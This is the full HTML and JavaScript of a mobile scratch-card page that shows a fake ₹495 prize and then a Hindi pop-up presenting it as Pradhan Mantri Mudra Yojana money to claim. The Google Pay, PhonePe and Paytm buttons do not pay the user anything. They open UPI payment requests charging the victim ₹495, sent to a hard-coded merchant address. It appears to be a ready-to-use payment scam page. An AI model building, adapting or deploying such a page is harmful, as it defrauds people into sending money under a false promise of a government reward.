<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Scratch Card</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .top-img, .bottom-img {
      width: 100%;
      max-width: 360px;
      margin: 10px auto;
      display: block;
      border-radius: 12px;
    }

    .card-container {
      position: relative;
      width: 320px;
      height: 320px;
      border-radius: 25px;
      overflow: hidden;
      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
      background: #fff;
    }

    .reward-layer {
      position: absolute;
      z-index: 1;
      width: 90%;
      height: 90%;
      top: 5%;
      left: 5%;
      object-fit: cover;
      border-radius: 25px;
    }

    .reward-amount {
      position: absolute;
      z-index: 2;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 28px;
      font-weight: bold;
      color: #d32f2f;
      animation: blink 1s infinite;
      background: rgba(255,255,255,0.85);
      padding: 6px 14px;
      border-radius: 10px;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }

    canvas {
      position: absolute;
      z-index: 3;
      top: 0;
      left: 0;
      border-radius: 25px;
    }

    .scratch-text {
      position: absolute;
      z-index: 4;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      padding: 10px 20px;
      background: rgba(0, 0, 0, 0.7);
      color: white;
      border-radius: 12px;
      font-size: 18px;
      font-weight: bold;
      animation: blink 2s infinite;
    }

    .hidden { display: none; }

    /* Modal */
    .modal {
      position: fixed;
      top: 60%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.6);
      padding: 0;
      z-index: 9999;
      display: none;
      align-items: center;
      justify-content: center;
      width: 100%;
    }

    .modal.show {
      display: flex;
    }

    .modal-box {
      background: #fff;
      padding: 20px 30px;
      border-radius: 14px;
      text-align: center;
      box-shadow: 0 10px 20px rgba(0,0,0,0.3);
      max-width: 90%;
    }

    .modal-box h2 {
      font-size: 18px;
      font-weight: bold;
      margin-bottom: 15px;
      color: #222;
    }

    .modal-box button {
      margin: 6px;
      padding: 10px 16px;
      font-size: 16px;
      border: none;
      border-radius: 10px;
      color: white;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .modal-box button img {
      width: 28px;
      height: 28px;
    }

    .btn-gpay { background: #1e88e5; }
    .btn-phonepe { background: #673ab7; }
    .btn-paytm { background: #00bcd4; }
  </style>
</head>
<body>

  <img src="https://i.ibb.co/nNCT43nb/IMG-1114.jpg" class="top-img" />

  <div class="card-container">
    <img src="https://i.ibb.co/9m8Y3s3R/IMG-1116.png" class="reward-layer hidden" id="rewardImage" />
    <div class="reward-amount hidden" id="rewardAmount">₹495</div>
    <canvas id="scratchCanvas"></canvas>
    <div class="scratch-text" id="scratchText">Scratch here!</div>
  </div>

  <img src="https://i.ibb.co/0RrqgRTj/IMG-1120.jpg" class="bottom-img" />
  <audio id="winSound" src="https://files.catbox.moe/phmdiy.mp3"></audio>
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>

  <!-- Modal -->
  <div id="upiModal" class="modal">
    <div class="modal-box">
      <h2>प्रधानमंत्री मुद्रा योजना के पैसे अपने खाते में ले</h2>
      <button class="btn-gpay" onclick="pay('gpay')">
        <img src="https://i.ibb.co/DHMmHM0x/IMG-1142.png" alt="GPay"> Google Pay
      </button>
      <button class="btn-phonepe" onclick="pay('phonepe')">
        <img src="https://i.ibb.co/d4Q0qxgM/IMG-1141.png" alt="PhonePe"> PhonePe
      </button>
      <button class="btn-paytm" onclick="pay('paytm')">
        <img src="https://i.ibb.co/35CLBQzZ/IMG-1145.png" alt="Paytm"> Paytm
      </button>
    </div>
  </div>

  <script>
    const canvas = document.getElementById("scratchCanvas");
    const ctx = canvas.getContext("2d");
    const container = document.querySelector(".card-container");
    const rewardImage = document.getElementById("rewardImage");
    const rewardAmount = document.getElementById("rewardAmount");
    const scratchText = document.getElementById("scratchText");
    const winSound = document.getElementById("winSound");
    const modal = document.getElementById("upiModal");

    canvas.width = container.offsetWidth;
    canvas.height = container.offsetHeight;

    const scratchLayer = new Image();
    scratchLayer.crossOrigin = "anonymous";
    scratchLayer.src = "https://i.ibb.co/nqr14xB9/IMG-1113.jpg";
    scratchLayer.onload = () => {
      ctx.globalCompositeOperation = "source-over";
      ctx.drawImage(scratchLayer, 0, 0, canvas.width, canvas.height);
    };

    let isDrawing = false, revealed = false, lastX = 0, lastY = 0;

    function getPosition(e) {
      const rect = canvas.getBoundingClientRect();
      const x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
      const y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;
      return { x, y };
    }

    function startScratch(x, y) {
      isDrawing = true;
      lastX = x;
      lastY = y;
      scratch(x, y, true);
      try { winSound.play().catch(() => {}); } catch (e) {}
    }

    function scratch(x, y, start = false) {
      ctx.globalCompositeOperation = "destination-out";
      ctx.lineCap = "round";
      ctx.lineJoin = "round";
      ctx.lineWidth = 40;
      ctx.beginPath();
      if (start) ctx.moveTo(x, y);
      else {
        ctx.moveTo(lastX, lastY);
        ctx.lineTo(x, y);
        ctx.stroke();
      }
      lastX = x;
      lastY = y;
    }

    function getScratchedPercent() {
      const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      let cleared = 0;
      for (let i = 0; i < imgData.data.length; i += 4) {
        if (imgData.data[i + 3] < 128) cleared++;
      }
      return (cleared / (imgData.data.length / 4)) * 100;
    }

    function checkReveal() {
      if (revealed || getScratchedPercent() < 30) return;
      revealed = true;
      canvas.classList.add("hidden");
      scratchText.classList.add("hidden");
      rewardImage.classList.remove("hidden");
      rewardAmount.classList.remove("hidden");
      try { winSound.play().catch(() => {}); } catch (e) {}
      confetti({ particleCount: 200, spread: 70, origin: { y: 0.6 } });
      setTimeout(() => modal.classList.add("show"), 3000);
    }

    canvas.addEventListener("mousedown", e => startScratch(...Object.values(getPosition(e))));
    canvas.addEventListener("mousemove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); });
    canvas.addEventListener("mouseup", () => isDrawing = false);
    canvas.addEventListener("mouseleave", () => isDrawing = false);

    canvas.addEventListener("touchstart", e => startScratch(...Object.values(getPosition(e))));
    canvas.addEventListener("touchmove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); e.preventDefault(); });
    canvas.addEventListener("touchend", () => isDrawing = false);

    function pay(app) {
      const pa = "g1g4822917.rzp@icici";
      const tr = "RZPQhptbTHPKvHtK8qrv2";
      const pn = "G1G4";
      const am = "495";
      const tn = "ScratchWin";
      const cu = "INR";
      let uri = "";

      if (app === "phonepe") {
        uri = `phonepe://pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`;
      } else if (app === "gpay") {
        uri = `gpay://upi/pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`;
      } else {
        uri = `paytmmp://pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`;
      }

      window.location.href = uri;
    }
  </script>
</body>
</html>
